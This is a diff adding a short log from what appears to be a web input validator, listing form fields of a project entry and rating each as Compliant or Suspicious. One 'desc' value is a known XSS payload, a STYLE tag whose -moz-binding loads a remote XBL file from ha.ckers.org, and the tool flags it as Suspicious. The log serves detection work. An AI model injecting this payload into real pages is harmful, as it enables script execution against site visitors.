@@ -1,0 +1,12 @@
+2016-07-17T18:26:39.670-06:00
+name : FP.'O'.
+desc : &lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt;
+end : 28.06.2016
+budget : 5,127
+company : -1
+assignto[] : 1
+assignme : 1
+The parameter: name :  having value: FP.'O'. is: Compliant
+The parameter: desc :  having value: &lt;STYLE&gt;BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}&lt;/STYLE&gt; is: Suspicious
+The parameter: end :  having value: 28.06.2016 is: Compliant
+The parameter: budget :  having value: 5,127 is: Compliant
